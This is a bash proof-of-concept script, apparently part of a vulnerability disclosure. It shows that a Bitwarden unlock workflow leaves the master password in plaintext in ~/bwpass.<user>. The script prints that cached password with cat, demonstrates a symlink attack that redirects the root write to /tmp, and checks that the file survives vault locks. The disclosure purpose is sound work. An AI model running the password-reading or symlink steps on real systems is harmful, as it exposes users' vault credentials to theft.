#!/bin/bash
# ============================================================
# PoC #2 — Plaintext Master Password Written to Disk (CRITICAL)
# Vulnerability: bin/unlock.sh:56
#
#   sudo -H --preserve-env=p sh -c \
#       'cd ; umask 077 ; echo "${p}" > bwpass.${SUDO_USER}'
#
# When Touch ID is enabled (pam_tid=1), the Bitwarden master password
# is written in plaintext to ~/bwpass.<username>.  The file survives
# vault locks (only removed on full logout).
#
# This PoC demonstrates:
#   A) Locating and reading the cached password file (attacker simulation)
#   B) Symlink attack: pre-placing a symlink so sudo's write is redirected
#   C) Persistence: proving the file is NOT removed on lock, only logout
# ============================================================

TARGET_USER="${USER}"
BWPASS_FILE="${HOME}/bwpass.${TARGET_USER}"

banner() { echo; echo "=== $* ==="; echo; }

# ---------- Part A: Read cached password ----------
banner "Part A — Read cached plaintext master password"

if [ -f "${BWPASS_FILE}" ]; then
    echo "[+] Found password cache file: ${BWPASS_FILE}"
    echo "[+] File permissions:"
    ls -la "${BWPASS_FILE}"
    echo
    echo "[+] Contents (master password):"
    cat "${BWPASS_FILE}"
    echo
    echo "RESULT: Master password obtained without any authentication."
else
    echo "[-] ${BWPASS_FILE} not found (Touch ID not yet used, or user logged out)."
    echo "    To simulate: set pam_tid=1 and unlock the vault once via the workflow."
    echo
    echo "    The vulnerable code path in unlock.sh:"
    echo '      sudo -H --preserve-env=p sh -c \'
    echo "          'cd ; umask 077 ; echo \"\${p}\" > bwpass.\${SUDO_USER}'"
    echo
    echo "    After one Touch ID unlock, this file exists with 0600 permissions"
    echo "    containing the raw master password."
fi

# ---------- Part B: Symlink attack ----------
banner "Part B — Symlink attack redirects password write"

EXFIL_TARGET="/tmp/stolen_bwpass_$(date +%s)"

echo "[*] Demonstrating symlink attack:"
echo "    An attacker pre-places a symlink at the expected path."
echo "    When the workflow writes the password (as root via sudo),"
echo "    it follows the symlink and writes to the attacker's target."
echo
echo "    Attack steps:"
echo "    1. Attacker removes or renames the existing bwpass file (if any)"
echo "    2. ln -s ${EXFIL_TARGET} ${BWPASS_FILE}"
echo "    3. Victim unlocks vault via Touch ID — sudo writes password"
echo "       to ${EXFIL_TARGET} (root-owned, world-readable if umask allows)"
echo "    4. Attacker reads ${EXFIL_TARGET}"
echo
echo "[*] Simulating step 2 (creating symlink, NOT removing original):"

if [ ! -e "${BWPASS_FILE}" ]; then
    ln -s "${EXFIL_TARGET}" "${BWPASS_FILE}"
    echo "[+] Symlink created: ${BWPASS_FILE} -> ${EXFIL_TARGET}"
    echo "[+] Next Touch ID unlock will write master password to: ${EXFIL_TARGET}"
    echo "[*] Cleaning up symlink (simulation only)..."
    rm "${BWPASS_FILE}"
    echo "[+] Symlink removed."
else
    echo "[-] ${BWPASS_FILE} already exists; skipping symlink creation to avoid"
    echo "    disrupting a live installation.  In a real attack the attacker"
    echo "    would first move/delete the original file."
fi

# ---------- Part C: File survives lock ----------
banner "Part C — Password file survives vault lock"

echo "The file is only removed in bin/logout.sh:"
echo '    rm -f "${DATA_DIR}"/*'
echo '    sudo -k'
echo
echo "bin/lock.sh does NOT remove the file."
echo "grep result for bwpass removal in lock.sh:"
grep -n "bwpass" /dev/stdin <<'GREP_INPUT' 2>/dev/null || true
# (checking actual lock.sh)
GREP_INPUT

grep -n "bwpass" "$(dirname "$0")/../bin/lock.sh" 2>/dev/null \
    && echo "    ^ found in lock.sh" \
    || echo "    [confirmed] 'bwpass' does NOT appear in lock.sh"

echo
echo "RESULT: The plaintext password persists on disk between lock/unlock cycles."
echo "        An attacker who gains file access once retains the master password"
echo "        indefinitely — even after the vault is locked."

# ---------- Part D: Disk forensics ----------
banner "Part D — File recoverable after logout (forensic perspective)"

echo "Even after logout removes the file, it may be recoverable via:"
echo "  - Time Machine / APFS snapshots"
echo "  - Disk imaging (echo writes data in-place; no secure wipe)"
echo "  - swap/hibernation files if memory was swapped while password was in RAM"
echo
echo "RESULT: Storing a master password in a plaintext flat file violates"
echo "        basic secrets-management hygiene.  The correct fix is macOS Keychain."
